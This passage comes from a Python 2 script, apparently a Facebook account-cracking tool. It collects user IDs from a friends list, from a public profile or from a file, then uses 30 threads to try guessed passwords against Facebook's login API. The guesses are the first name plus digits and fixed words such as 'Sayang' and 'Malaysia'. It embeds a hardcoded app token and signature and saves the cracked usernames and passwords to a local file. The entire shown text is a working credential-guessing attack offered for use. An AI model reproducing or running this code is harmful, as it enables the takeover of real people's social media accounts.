            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Malaysia'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mDone ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_india():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo11
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friends list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_india()


def pilih_india():
    teak = raw_input('\x1b[1;91mWhich Choice  Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m wrong...!'
        pilih_india()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo13
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo13
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend doent exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo13
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File doesnt exist !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                    crack_india()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
                pilih_india()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'India123'
